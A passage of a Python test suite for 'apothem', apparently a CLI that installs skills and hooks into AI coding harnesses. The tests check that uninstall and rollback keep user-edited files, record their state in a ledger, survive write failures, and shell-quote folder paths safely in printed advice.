        "cursor", root=current, allowed_root=Path.home(), home=home
    )

    assert (home / "memory" / "note.md").read_text(encoding="utf-8") == "kept\n"
    assert result is not None
    # Quoted as the shell the command is pasted into reads it: a temporary
    # folder never ends in a backslash.
    quoted = f'"{gone}"' if os.name == "nt" else f"'{gone}'"
    if live_holder:
        assert result.outcome == "unchanged"
        assert str(live) in result.message
    else:
        assert result.outcome == "warning"
        assert "no longer exists" in result.message
        assert f"apothem install --harness cursor --project {quoted}" in result.message
        assert "--profile <the profile it used>" in result.message
        assert (
            f"apothem uninstall --harness cursor --project {quoted} --yes"
            in result.message
        )


_SHARE = _BS * 2 + "server" + _BS + "my share" + _BS

#: Folders and how each shell quotes them in a printed command (``None``: the
#: quotes cannot carry it, so the steps are given in words).
_QUOTED = (
    (True, "C:" + _BS, '"C:' + _BS * 2 + '"'),
    (True, "C:" + _BS + "my work" + _BS, '"C:' + _BS + "my work" + _BS * 2 + '"'),
    # Git Bash reads a share's two leading backslashes as one inside double
    # quotes, so the command would name \server\my share.
    (True, _SHARE, None),
    (True, _SHARE.rstrip(_BS), None),
    (True, "C:" + _BS + "O'Brien & Co (x)", '"C:' + _BS + "O'Brien & Co (x)" + '"'),
    (True, "C:" + _BS + "work" + _BS + "$site", None),
    (True, "C:" + _BS + "tick`n", None),
    (True, "C:" + _BS + "100%PATH%", None),
    (True, "C:" + _BS + "wow!", None),
    (True, "C:" + _BS + 'a"b', None),
    (True, "C:" + _BS + chr(0x201C) + "draft" + chr(0x201D), None),
    (True, "C:" + _BS + "a\tb", None),
    # Double quotes carry the curly single quotes.
    (
        True,
        "C:" + _BS + "O" + chr(0x2019) + "Brien",
        '"C:' + _BS + "O" + chr(0x2019) + "Brien" + '"',
    ),
    (False, "/home/u/my $proj", "'/home/u/my $proj'"),
    (False, "/home/u/proj", "'/home/u/proj'"),
    (False, '/home/u/`x` %y% !z "q"', "'/home/u/`x` %y% !z \"q\"'"),
    (False, "/home/u/O'Brien x", None),
    (False, "/home/u/a\nb", None),
    # PowerShell also ends a single-quoted string at each curly single quote.
    (False, "/home/u/O" + chr(0x2018) + "Brien", None),
    (False, "/home/u/O" + chr(0x2019) + "Brien", None),
    (False, "/home/u/" + chr(0x201A) + "low", None),
    (False, "/home/u/" + chr(0x201B) + "high", None),
)


@pytest.mark.parametrize(("windows", "path", "quoted"), _QUOTED)
def test_a_printed_folder_is_quoted_for_the_shell(
    windows: bool, path: str, quoted: str | None
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    assert datahome.shell_quoted(path, windows=windows) == quoted


def test_a_folder_the_quotes_cannot_carry_gets_the_steps_in_words() -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    # The apostrophe ends single quotes; the $ expands inside double quotes.
    gone = "/work/it's $site"

    message = datahome._release_steps(Path("/x/.apothem"), "cursor", gone)

    assert f"recreate {gone}, run apothem install --harness cursor with" in message
    assert "--project set to that folder and --profile set to the profile" in message
    assert "apothem uninstall with the same --harness and --project" in message
    assert "--project '" not in message
    assert '--project "' not in message


def test_a_failure_while_listing_what_stayed_records_the_uninstall_unfinished(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})

    def broken(*args: object, **kwargs: object) -> list[object]:
        raise OSError("listing failed")

    monkeypatch.setattr(install_driver_lifecycle, "left_behind", broken)
    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert _unfinished(claude) is not None


def test_the_plain_output_names_every_file_its_advice_is_about(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    skill = claude / "skills" / _skill_name()
    mine = skill / "mine.md"
    mine.write_text("mine\n", encoding="utf-8")
    edited = skill / "SKILL.md"
    edited.write_text(edited.read_text(encoding="utf-8") + "\nmy edit\n", "utf-8")
    agents = sorted((claude / "agents").glob("*.md"))[:2]
    for agent in agents:
        agent.write_text("my own agent\n", encoding="utf-8")

    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )
    code, envelope = _uninstall()

    assert plain.exit_code == cli._EXIT_PARTIAL, plain.output
    for path in (mine, edited, *agents):
        assert str(path) in plain.output, path
    assert code == cli._EXIT_PARTIAL
    listed = {path for w in envelope["warnings"] for path in w.get("files", [])}
    assert {str(mine), str(edited), *(str(agent) for agent in agents)} <= listed


def test_a_failed_write_of_the_finished_record_leaves_a_retry(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    real = install_ledger.append_record

    def refuse_finished(record: LedgerRecord, **kwargs: object) -> Path:
        if record.kind == "uninstall":
            raise OSError("disk full")
        return real(record, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(install_ledger, "append_record", refuse_finished)
    code, envelope = _uninstall()
    monkeypatch.setattr(install_ledger, "append_record", real)

    assert code == cli._EXIT_PARTIAL, envelope
    assert _unfinished(claude) is not None


def test_a_user_scope_holder_gets_steps_not_a_command_for_the_default_folder(
    claude: Path, tmp_path: Path
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    home = Path.home() / ".apothem"
    (home / "memory").mkdir(parents=True)
    current = tmp_path / "project"
    current.mkdir()
    for harness, root in (("cursor", current), ("codex", tmp_path / "codex-gone")):
        install_ledger.append_record(
            LedgerRecord.create(
                harness=harness, root=root, kind="install", data_home=str(home)
            )
        )

    result = datahome._remove_data_home(
        "cursor", root=current, allowed_root=Path.home(), home=home
    )

    assert result is not None
    assert result.outcome == "warning"
    assert "CODEX_HOME" in result.message
    assert "apothem uninstall --harness codex" not in result.message


def test_a_folder_kept_whole_is_reported_once(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    edited = sorted(path for path in skill.rglob("*") if path.is_file())
    for path in edited:
        path.write_text("my edit\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert sorted(listed) == sorted({*listed})
    assert {str(path) for path in edited} <= set(listed)
    assert all(path.read_text(encoding="utf-8") == "my edit\n" for path in edited)


def test_an_earlier_release_folder_names_the_users_own_file_apart(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    skill = claude / "skills" / _skill_name()
    edited = skill / "SKILL.md"
    edited.write_text(edited.read_text(encoding="utf-8") + "\nmy edit\n", "utf-8")
    mine = skill / "mine.md"
    mine.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    by_reason: dict[str, set[str]] = {}
    for warning in envelope["warnings"]:
        reason = warning.get("detail", {}).get("kept_reason", "")
        by_reason.setdefault(reason, set()).update(warning.get("files", []))
    assert str(edited) in by_reason["no-digests"]
    assert str(mine) not in by_reason["no-digests"]
    assert str(mine) in by_reason["changed"]


def test_a_file_that_cannot_be_removed_still_names_the_users_files(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    stuck = skill / "SKILL.md"
    mine = skill / "mine.md"
    mine.write_text("mine\n", encoding="utf-8")
    real_unlink = Path.unlink

    def refuse(self: Path, missing_ok: bool = False) -> None:
        if self == stuck:
            raise PermissionError("in use")
        real_unlink(self, missing_ok=missing_ok)

    monkeypatch.setattr(Path, "unlink", refuse)
    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert str(mine) in listed


def test_an_install_with_no_record_leaves_the_uninstall_unfinished(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    shutil.rmtree(install_ledger.ledger_path("claude_code").parent)

    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert plain.exit_code == cli._EXIT_PARTIAL, plain.output
    assert "apothem update" in plain.output
    assert (claude / "agents" / "citation-auditor.md").exists()


def test_quiet_still_lists_the_paths_an_unfinished_uninstall_kept(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = claude / "agents" / "citation-auditor.md"
    agent.write_text("an earlier release wrote this\n", encoding="utf-8")

    result = CliRunner().invoke(
        cli.main,
        ["uninstall", "--harness", "claude-code", "--yes", "--quiet", "--no-color"],
    )

    assert result.exit_code == cli._EXIT_PARTIAL
    assert str(agent) in result.stderr


def test_a_kept_file_name_with_a_line_separator_is_listed_whole(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    odd = claude / "skills" / _skill_name() / "notes\u2028v2.md"
    odd.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert str(odd) in listed


def test_an_earlier_releases_differing_files_behind_a_link_block_the_uninstall(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    rules = claude / "rules"
    for rule in rules.glob("*.md"):
        rule.write_text(rule.read_text(encoding="utf-8") + "\nolder text\n", "utf-8")
    dotfiles = tmp_path / "dotfiles" / "rules"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(rules), str(dotfiles))
    _link_folder(rules, dotfiles)

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert "still loads them" in envelope["results"][0]["message"]
    assert _unfinished(claude) is not None


def test_a_leftover_after_a_finished_uninstall_lets_the_next_one_finish(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    notes = claude / "skills" / _skill_name() / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")
    cache = claude / ".apothem" / "support" / "hooks" / "lib" / "__pycache__"
    cache.mkdir()
    (cache / "x.pyc").write_bytes(b"cache")
    first, _ = _uninstall()

    code, envelope = _uninstall()

    assert first == 0
    assert code == 0, envelope
    assert envelope["status"] == "success"
    assert _unfinished(claude) is None
    assert notes.read_text(encoding="utf-8") == "mine\n"
    assert (cache / "x.pyc").read_bytes() == b"cache"
    kept = {
        path
        for warning in envelope["warnings"]
        if warning.get("detail", {}).get("kept_reason") == "no-active-install"
        for path in warning.get("files", [])
    }
    assert {str(notes), str(cache / "x.pyc")} <= kept


def test_a_second_uninstall_with_no_record_still_does_not_finish(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    shutil.rmtree(install_ledger.ledger_path("claude_code").parent)
    first, _ = _uninstall()

    code, envelope = _uninstall()

    assert first == cli._EXIT_PARTIAL
    assert code == cli._EXIT_PARTIAL, envelope
    assert _unfinished(claude) is not None
    assert (claude / "agents" / "citation-auditor.md").exists()


def _installed_support(tmp_path: Path) -> tuple[Path, dict[str, str]]:
    """Copy the hook and gate scripts as an install lays them out.

    Returns the support folder and an environment that lets Python write
    bytecode caches next to the scripts it imports.
    """
    support = tmp_path / "support"
    for folder in ("hooks", "conformity"):
        shutil.copytree(
            Path("src/apothem") / folder,
            support / folder,
            ignore=shutil.ignore_patterns("__pycache__", "*.pyc"),
        )
    env = {
        name: value
        for name, value in os.environ.items()
        if name not in {"PYTHONDONTWRITEBYTECODE", "PYTHONPYCACHEPREFIX"}
    }
    return support, env


@pytest.mark.parametrize("script", ["hooks/dispatch.py", "conformity/gate.py"])
def test_a_hook_entry_script_writes_no_bytecode_cache(
    tmp_path: Path, script: str
) -> None:
    support, env = _installed_support(tmp_path)
    # Switched off, each script still imports its sibling modules first.
    env["APOTHEM_HOOKS_DISABLE"] = "1"
    arguments = ["--event-name", "Stop"] if script.startswith("hooks") else ["--hook"]

    subprocess.run(
        [sys.executable, str(support / script), *arguments],
        env=env,
        input="",
        capture_output=True,
        text=True,
        timeout=120,
        check=True,
    )

    assert not list(support.rglob("__pycache__"))


def test_a_standalone_validator_of_the_installed_gate_writes_no_bytecode_cache(
    tmp_path: Path,
) -> None:
    support, env = _installed_support(tmp_path)
    project = tmp_path / "project"
    project.mkdir()

    done = subprocess.run(
        [
            sys.executable,
            str(support / "conformity" / "gate.py"),
            "--check",
            "naming-grep",
            str(project),
        ],
        env=env,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )

    assert "naming" in done.stdout, done.stderr
    assert not list(support.rglob("__pycache__"))


@pytest.mark.parametrize("earlier", [False, True])
def test_a_file_that_cannot_be_removed_is_named_as_stuck_not_as_kept(
    claude: Path, monkeypatch: pytest.MonkeyPatch, earlier: bool
) -> None:
    ClaudeCodeAdapter().install({})
    if earlier:
        _strip_digests(claude)
    skill = claude / "skills" / _skill_name()
    stuck = skill / "SKILL.md"
    mine = skill / "mine.md"
    mine.write_text("mine\n", encoding="utf-8")
    real_unlink = Path.unlink

    def refuse(self: Path, missing_ok: bool = False) -> None:
        if self == stuck:
            raise PermissionError("in use")
        real_unlink(self, missing_ok=missing_ok)

    monkeypatch.setattr(Path, "unlink", refuse)
    code, envelope = _uninstall()
    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert code == cli._EXIT_PARTIAL, envelope
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert str(mine) in listed
    assert str(stuck) not in listed
    assert "no record shows" not in envelope["results"][0]["message"]
    step = next(row for row in envelope["results"][1:] if row["path"] == str(skill))
    assert "stuck_files" not in step.get("detail", {})
    assert step["stuck"] == [str(stuck)]
    assert step["files"] == [str(mine)]
    assert plain.exit_code != 0, plain.output
    assert "could not remove 1 file(s) Apothem wrote" in plain.stderr
    assert f"\n    {stuck}" in plain.stderr
    assert str(stuck) not in plain.stdout


def _evidence_only(claude: Path) -> None:
    """Leave an install with no record, and none of its files but one of yours.

    The file sits in an Apothem folder (``.apothem/support/templates``) at a
    name the install never writes, so the harness still reads as installed.
    """
    shutil.rmtree(install_ledger.ledger_path("claude_code").parent)
    shutil.rmtree(claude)
    evidence = claude / ".apothem" / "support" / "templates" / "mine.txt"
    evidence.parent.mkdir(parents=True)
    evidence.write_text("mine\n", encoding="utf-8")


def test_an_empty_folder_with_no_record_leaves_the_uninstall_unfinished(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _evidence_only(claude)
    empty = claude / "skills" / _skill_name()
    empty.mkdir(parents=True)

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert _unfinished(claude) is not None
    assert empty.is_dir()
    (warning,) = envelope["warnings"]
    assert warning["files"] == [str(empty)]
    assert "no install record shows whether Apothem wrote it" in warning["message"]
    message = envelope["results"][0]["message"]
    assert message.startswith("1 path(s) stay because no record shows")
    assert "first copy any listed file you edited or added" in message


def test_a_grouped_line_lists_every_kept_path(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    _evidence_only(claude)
    agent = claude / "agents" / "citation-auditor.md"
    agent.parent.mkdir(parents=True)
    agent.write_text("mine\n", encoding="utf-8")
    empty = claude / "skills" / _skill_name()
    empty.mkdir(parents=True)

    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert plain.exit_code == cli._EXIT_PARTIAL, plain.output
    assert "2 paths were kept: no install record shows whether" in plain.stdout
    assert f"\n    {agent}" in plain.stdout
    assert f"\n    {empty}" in plain.stdout
    assert "uninstall did not finish: 2 path(s) stay because" in plain.stderr


def test_the_grouped_line_and_the_failure_count_the_same_paths(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    skill = next(
        folder
        for folder in sorted((claude / "skills").iterdir())
        if len([path for path in folder.rglob("*") if path.is_file()]) >= 2
    )
    edited = sorted(path for path in skill.rglob("*") if path.is_file())[:2]
    agent = claude / "agents" / "citation-auditor.md"
    for path in (*edited, agent):
        path.write_text("an earlier release wrote this\n", encoding="utf-8")

    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert plain.exit_code == cli._EXIT_PARTIAL, plain.output
    assert "2 paths were kept: the install record (made by an earlier" in plain.stdout
    assert "uninstall did not finish: 2 path(s) stay because" in plain.stderr
    for path in (*edited, agent):
        assert str(path) in plain.stdout, path


def test_a_rollback_of_an_earlier_release_install_gives_no_uninstall_advice(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = claude / "agents" / "citation-auditor.md"

    plain = CliRunner().invoke(
        cli.main, ["rollback", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert plain.exit_code == 0, plain.output
    assert agent.exists()
    assert f"{agent} was kept: an earlier release recorded it without" in plain.stdout
    assert "rollback cannot tell it is Apothem's" in plain.stdout
    assert "differs from what this release writes" not in plain.output
    assert "apothem update" not in plain.output
    assert "apothem uninstall" not in plain.output


def test_a_stopped_uninstall_prints_its_warnings_where_a_finished_one_does(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    agent = claude / "agents" / "citation-auditor.md"
    agent.write_text("my own agent\n", encoding="utf-8")
    real = written.backup_existing

    def full(target: Path, **kwargs: object) -> object:
        if ".apothem" in target.parts:
            raise OSError("backup disk full")
        return real(target, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(written, "backup_existing", full)
    loud = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )
    quiet = CliRunner().invoke(
        cli.main,
        ["uninstall", "--harness", "claude-code", "--yes", "--quiet", "--no-color"],
    )

    assert loud.exit_code == cli._EXIT_PARTIAL, loud.output
    assert "uninstall stopped after removing files" in loud.stderr
    assert str(agent) in loud.stdout
    assert str(agent) not in loud.stderr
    assert quiet.exit_code != 0, quiet.output
    assert str(agent) in quiet.stderr


def test_a_rollback_whose_restore_fails_still_lists_the_files_it_kept(
    claude: Path, tmp_path: Path
) -> None:
    claude.mkdir()
    (claude / "settings.json").write_text('{"theme": "dark"}\n', encoding="utf-8")
    ClaudeCodeAdapter().install({})
    notes = claude / "skills" / _skill_name() / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")
    shutil.rmtree(tmp_path / "apothem-backups")

    plain = CliRunner().invoke(
        cli.main, ["rollback", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert plain.exit_code != 0, plain.output
    assert "restore failed" in plain.stderr
    assert str(notes) in plain.stdout
    assert notes.read_text(encoding="utf-8") == "mine\n"


def test_a_kept_link_name_with_a_line_separator_is_named_whole(
    tmp_path: Path,
) -> None:
    from apothem.harnesses._shared.install_driver_pathsafety import kept_links_detail
    from apothem.harnesses._shared.install_driver_sweep import kept_link_warnings
    from apothem.harnesses._shared.install_driver_types import _result

    odd = tmp_path / "notes\u2028v2-link"
    removal = _result(
        "updated",
        "remove_existing",
        tmp_path,
        "removed the files Apothem wrote",
        detail=kept_links_detail([odd]),
    )

    assert [warning.path for warning in kept_link_warnings([removal])] == [str(odd)]


def test_an_uninstall_after_a_rollback_it_could_not_check_does_not_finish(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = claude / "agents" / "citation-auditor.md"
    rolled = CliRunner().invoke(
        cli.main, ["rollback", "--harness", "claude-code", "--yes", "--no-color"]
    )

    code, envelope = _uninstall()

    assert rolled.exit_code == 0, rolled.output
    assert code == cli._EXIT_PARTIAL, envelope
    assert agent.exists()
    reasons = {w.get("detail", {}).get("kept_reason") for w in envelope["warnings"]}
    assert "no-record" in reasons
    assert "no-active-install" not in reasons
    assert _unfinished(claude) is not None


def test_a_stuck_file_is_named_when_the_uninstall_stops(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    stuck = claude / "skills" / _skill_name() / "SKILL.md"
    real_unlink = Path.unlink

    def refuse(self: Path, missing_ok: bool = False) -> None:
        if self == stuck:
            raise PermissionError("in use")
        real_unlink(self, missing_ok=missing_ok)

    def broken(*args: object, **kwargs: object) -> list[object]:
        raise OSError("listing failed")

    monkeypatch.setattr(Path, "unlink", refuse)
    monkeypatch.setattr(install_driver_lifecycle, "left_behind", broken)
    result = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert result.exit_code == cli._EXIT_PARTIAL, result.output
    assert "uninstall stopped after removing files" in result.stderr
    assert f"    {stuck}" in result.stderr


def test_an_earlier_release_path_this_release_does_not_write_claims_no_compare() -> (
    None
):
    from apothem.harnesses._shared.install_driver_written import _why_kept

    entry = LedgerTarget.from_dict(
        {"path": "/x/old-skill", "mode": "tree", "ownership_class": "apothem-owned"}
    )

    reason, message = _why_kept(
        {"/x/old-skill": entry}, entry, lambda _target: None, ended=False
    )

    assert reason == "no-digests"
    assert "differs" not in message
    assert "writes nothing there to compare it with" in message
    assert "then run apothem update, then apothem uninstall again" in message


def _unrecorded_install(claude: Path) -> None:
    """Uninstall, then install again with no record of that install left.

    The install wrote its files, but its record never reached the ledger (it
    stopped before it recorded itself, say), so the latest record here is the
    finished uninstall.
    """
    ClaudeCodeAdapter().install({})
    first, _ = _uninstall()
    assert first == 0
    ledger = install_ledger.ledger_path("claude_code")
    finished = ledger.read_bytes()
    ClaudeCodeAdapter().install({})
    ledger.write_bytes(finished)


def test_apothems_files_left_after_a_finished_uninstall_are_removed(
    claude: Path,
) -> None:
    _unrecorded_install(claude)
    agent = claude / "agents" / "citation-auditor.md"
    skill = claude / "skills" / _skill_name()
    present = agent.is_file() and skill.is_dir()

    code, envelope = _uninstall()

    assert present
    assert code == 0, envelope
    assert envelope["status"] == "success"
    assert not agent.exists()
    assert not skill.exists()
    assert _unfinished(claude) is None
    # Only the two files that hold the interpreter's path stay: with no record,
    # nothing shows which interpreter the install wrote there.
    kept = {path for w in envelope["warnings"] for path in w.get("files", [])}
    assert kept == {
        str(claude / ".apothem" / "support" / "conformity" / "gate.py"),
        str(claude / "statuslines" / "conformity.json"),
    }


def test_what_differs_after_a_finished_uninstall_stays_and_it_finishes(
    claude: Path,
) -> None:
    _unrecorded_install(claude)
    agent = claude / "agents" / "citation-auditor.md"
    agent.write_text("my edits\n", encoding="utf-8")
    skill = claude / "skills" / _skill_name()
    notes = skill / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert envelope["status"] == "success"
    assert agent.read_text(encoding="utf-8") == "my edits\n"
    assert notes.read_text(encoding="utf-8") == "mine\n"
    assert not (skill / "SKILL.md").exists()
    assert _unfinished(claude) is None
    reasons = {
        path: warning["detail"]["kept_reason"]
        for warning in envelope["warnings"]
        for path in warning.get("files", [])
    }
    assert reasons[str(agent)] == "no-active-install"
    assert str(notes) in reasons
    messages = " ".join(str(w["message"]) for w in envelope["warnings"])
    assert "no install record lists them, and they do not match what" in messages
    assert "earlier uninstall" not in messages
    assert "last uninstall" not in messages


def test_an_interpreter_you_repointed_stays_after_a_finished_uninstall(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    statusline = claude / "statuslines" / "conformity.json"
    data = statusline.read_bytes()
    ours = json.loads(data)["commandWindows"].split(" ", 1)[0]
    other = tmp_path / "other-python" / "python.exe"
    other.parent.mkdir()
    other.write_bytes(b"")
    repointed = data.replace(ours.encode("utf-8"), other.as_posix().encode("utf-8"))
    statusline.write_bytes(repointed)
    cache = claude / ".apothem" / "support" / "conformity" / "__pycache__"
    cache.mkdir()
    (cache / "gate.pyc").write_bytes(b"cache")
    first, _ = _uninstall()
    installed = ClaudeCodeAdapter().is_installed()

    code, envelope = _uninstall()

    assert repointed != data
    assert first == 0
    assert installed is True
    assert code == 0, envelope
    assert envelope["status"] == "success"
    assert statusline.read_bytes() == repointed
    assert _unfinished(claude) is None


def test_an_empty_folder_left_after_a_finished_uninstall_goes(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    cache = claude / ".apothem" / "support" / "hooks" / "lib" / "__pycache__"
    cache.mkdir()
    (cache / "x.pyc").write_bytes(b"cache")
    first, _ = _uninstall()
    skill = claude / "skills" / _skill_name()
    (skill / "references").mkdir(parents=True)

    code, envelope = _uninstall()

    assert first == 0
    assert code == 0, envelope
    assert not skill.exists()
    assert all(str(skill) not in str(w["message"]) for w in envelope["warnings"])
    assert (cache / "x.pyc").read_bytes() == b"cache"


def test_a_folder_left_holding_only_empty_folders_goes(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    for path in [path for path in skill.rglob("*") if path.is_file()]:
        path.unlink()
    (skill / "mine-empty" / "deeper").mkdir(parents=True)

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert not skill.exists()
    assert all(str(skill) not in str(w["message"]) for w in envelope["warnings"])


def test_a_folder_holding_no_file_that_does_not_go_is_reported(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    folder = tmp_path / "skill"
    (folder / "empty").mkdir(parents=True)
    real_rmdir = Path.rmdir

    def refuse(self: Path) -> None:
        if self == folder:
            raise PermissionError("in use")
        real_rmdir(self)

    monkeypatch.setattr(Path, "rmdir", refuse)
    result = written._kept_folder(folder, None)

    assert result is not None
    assert result.outcome == "warning"
    assert result.message == f"{folder} was kept: it could not be removed"
    assert not (folder / "empty").exists()


def _fail_while_recording(
    monkeypatch: pytest.MonkeyPatch, **failures: BaseException
) -> None:
    """Make the named calls raise while the finished uninstall record is appended.

    *failures* maps an ``os`` function (``fsync``, ``ftruncate``) or the
    ledger's directory sync (``fsync_dir``) to what it raises.
    """
    from apothem.lib import atomic_io

    armed = {"on": False}
    real_append = install_ledger.append_record

    def append(record: LedgerRecord, **kwargs: object) -> Path:
        armed["on"] = record.kind == "uninstall"
        try:
            return real_append(record, **kwargs)  # type: ignore[arg-type]
        finally:
            armed["on"] = False

    for name, error in failures.items():
        owner, attribute = (
            (atomic_io, "_fsync_dir") if name == "fsync_dir" else (os, name)
        )
        real = getattr(owner, attribute)

        def failing(
            *args: object, _real: object = real, _error: BaseException = error
        ) -> object:
            if armed["on"]:
                raise _error
            return _real(*args)  # type: ignore[operator]

        monkeypatch.setattr(owner, attribute, failing)
    monkeypatch.setattr(install_ledger, "append_record", append)


def _kinds(claude: Path) -> list[str]:
    return [
        record.kind
        for record in install_ledger.read_records("claude_code")
        if record.root == _root(claude)
    ]


def test_a_record_whose_sync_fails_is_taken_back_and_the_uninstall_unfinished(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    _fail_while_recording(monkeypatch, fsync=OSError(errno.EIO, "I/O error"))

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert _kinds(claude) == ["install", "uninstall-incomplete"]


def test_an_interrupt_while_the_record_is_saved_leaves_the_uninstall_unfinished(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    _fail_while_recording(monkeypatch, fsync=KeyboardInterrupt())

    with pytest.raises(KeyboardInterrupt):
        ClaudeCodeAdapter().uninstall()

    assert _kinds(claude) == ["install", "uninstall-incomplete"]


def test_an_interrupt_after_the_record_is_saved_keeps_the_uninstall_finished(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    _fail_while_recording(monkeypatch, fsync_dir=KeyboardInterrupt())

    with pytest.raises(KeyboardInterrupt):
        ClaudeCodeAdapter().uninstall()

    assert _kinds(claude) == ["install", "uninstall"]
    assert ClaudeCodeAdapter().is_installed() is False


def test_a_record_left_in_after_its_sync_fails_stands_with_a_warning(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    _fail_while_recording(
        monkeypatch,
        fsync=OSError(errno.EIO, "I/O error"),
        ftruncate=OSError(errno.EIO, "I/O error"),
    )

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert envelope["status"] == "success"
    # Retention ran after the finished record, so only that record is left.
    assert _kinds(claude) == ["uninstall"]
    ledger = str(install_ledger.ledger_path("claude_code"))
    (note,) = [w for w in envelope["warnings"] if w["path"] == ledger]
    assert "the uninstall finished, but its record may not have been" in note["message"]


def test_a_record_lost_after_a_finished_uninstall_leaves_it_finished(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _unrecorded_install(claude)
    real_append = install_ledger.append_record

    def full(record: LedgerRecord, **kwargs: object) -> Path:
        if record.kind == "uninstall":
            raise OSError(errno.ENOSPC, "No space left on device")
        return real_append(record, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(install_ledger, "append_record", full)
    code, envelope = _uninstall()

    assert code == 0, envelope
    assert envelope["status"] == "success"
    assert _kinds(claude) == ["uninstall"]
    ledger = str(install_ledger.ledger_path("claude_code"))
    (note,) = [w for w in envelope["warnings"] if w["path"] == ledger]
    assert "the uninstall finished, but its record may not have been" in note["message"]


def test_an_uninstall_record_the_ledger_cannot_take_names_the_ledger(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})

    def full(record: LedgerRecord, **kwargs: object) -> Path:
        raise OSError(errno.ENOSPC, "No space left on device")

    monkeypatch.setattr(install_ledger, "append_record", full)
    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert _kinds(claude) == ["install"]
    ledger = str(install_ledger.ledger_path("claude_code"))
    (note,) = [w for w in envelope["warnings"] if w["path"] == ledger]
    assert "did not finish, and that could not be recorded" in note["message"]
    assert "Copy the backups it took" in note["message"]


def _stuck_after_a_finished_uninstall(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> tuple[Path, int, dict]:  # type: ignore[type-arg]
    """Uninstall after a finished one while an agent file cannot be removed.

